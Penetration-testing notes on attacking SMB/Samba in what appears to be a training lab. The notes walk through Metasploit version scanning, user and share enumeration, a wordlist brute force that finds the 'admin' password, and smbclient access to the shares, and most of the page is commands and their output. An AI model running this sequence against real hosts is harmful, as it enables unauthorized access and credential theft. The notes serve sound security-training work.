Protocol used to facilitate file sharing in a local network.
Using port 445
Samba is the linux implementation of SMB
# Version
```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.114.79.3:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{626d6173-2d61-6572-636f-6e0000000000}) (authentication domain:SAMBA-RECON)
[*] 192.114.79.3:445      -   Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.114.79.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Enumerate User
```bash
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > run

[*] 192.114.79.3:445 - Using automatically identified domain: SAMBA-RECON
[+] 192.114.79.3:445 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[+] 192.114.79.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.114.79.3:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Enumerate Shares
A shares is a place where are stored files.
```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > run

[+] 192.114.79.3:139 - public - (DISK) 
[+] 192.114.79.3:139 - john - (DISK) 
[+] 192.114.79.3:139 - aisha - (DISK) 
[+] 192.114.79.3:139 - emma - (DISK) 
[+] 192.114.79.3:139 - everyone - (DISK) 
[+] 192.114.79.3:139 - IPC$ - (IPC|SPECIAL) IPC Service (samba.recon.lab)
[*] 192.114.79.3: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Bruteforce
You can perform a bruteforce attack on smb with the `smb_login` module
```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > 

msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER admin
SMBUSER => admin

msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.65.237.3:445      - 192.65.237.3:445 - Starting SMB login bruteforce
[-] 192.65.237.3:445      - 192.65.237.3:445 - Failed: '.\admin:admin',
...
[+] 192.65.237.3:445      - 192.65.237.3:445 - Success: '.\admin:password'
[*] 192.65.237.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] 192.65.237.3:445      - Bruteforce completed, 1 credential was successful.
[*] 192.65.237.3:445      - You can open an SMB session with these credentials and CreateSession set to true
```
# Login
## Show accessible share
```bash
$> smbclient -L \\\\<IP>\\ -U <USER>
Password for [WORKGROUP\<USER>]:

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

```
## Enter in a share
```bash
$> smbclient \\\\192.65.237.3\\public -U admin                                                                                                         
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 19:06:13 2018
  ..                                  D        0  Tue Nov 27 19:06:13 2018
  secret                              D        0  Tue Nov 27 19:06:13 2018
  dev                                 D        0  Tue Nov 27 19:06:13 2018

                1981311780 blocks of size 1024. 118555336 blocks available
```
Use the `get` command to download a file.
